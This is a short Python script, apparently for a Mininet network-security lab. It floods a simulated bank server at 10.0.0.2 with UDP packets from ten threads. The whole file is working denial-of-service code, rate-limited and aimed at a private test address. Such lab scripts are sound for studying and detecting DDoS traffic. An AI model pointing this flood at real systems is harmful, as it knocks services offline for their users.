#!/usr/bin/env python3
"""
Controlled DDoS Traffic Generator
To be run on Mininet host h4 (Attacker)
Usage: python3 ddos_generator.py
"""

import socket
import time
import random
import threading

TARGET_IP = "10.0.0.2"  # Bank Server
TARGET_PORT = 8855
NUM_THREADS = 10
PACKETS_PER_THREAD = 1000

def attack_thread(thread_id):
    print(f"[*] Thread {thread_id} started attacking {TARGET_IP}:{TARGET_PORT}")
    try:
        # We use UDP to easily generate high volume traffic without TCP handshake overhead
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random.randbytes(1024)  # 1KB payload
        
        for i in range(PACKETS_PER_THREAD):
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            # Minimal sleep to prevent VM crash while maintaining high rate
            time.sleep(0.005)
            
        sock.close()
    except Exception as e:
        print(f"[-] Thread {thread_id} error: {e}")

print("=" * 50)
print(" 🚨 CONTROLLED DDoS GENERATOR STARTING 🚨 ")
print("=" * 50)
print(f"Target: {TARGET_IP}:{TARGET_PORT}")
print(f"Threads: {NUM_THREADS}")
print(f"Packets/Thread: {PACKETS_PER_THREAD}")
print("=" * 50)

threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=attack_thread, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("\n[+] DDoS simulation completed.")
